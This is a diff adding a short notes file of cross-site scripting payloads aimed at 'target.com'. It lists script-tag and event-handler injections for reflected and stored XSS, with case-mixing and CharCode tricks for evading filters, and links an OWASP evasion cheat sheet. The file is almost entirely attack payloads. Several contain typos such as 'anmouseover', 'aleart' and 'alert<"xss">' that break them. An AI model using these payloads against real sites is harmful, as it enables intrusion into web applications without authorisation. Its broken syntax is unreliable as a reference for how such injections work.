@@ -1,0 +1,18 @@
+http://target.com/page.php?something=something
+
+#reflected xss
+http://target.com/page.php?something=<script>alert<"xss"></script>
+
+https://www.owasp.org/index.php/xss_filter_evasion_cheat_sheet
+
+<sCripT>alert("xss")</scRipt>
+<a anmouseover = "alert('xss')">xss link</a>
+<IMG SRC = # onmouseover="alert('xss')">
+
+#storred xss
+<SCRIpT>alert(string .from CharCode(108,97,108,97))</sCripT>
+<sCripT>alert("xss")</scRipt>
+<<script>aleart("xss");//<</SCRIPT>
+
+#CHECK CHARCODE SIMULATOR
+
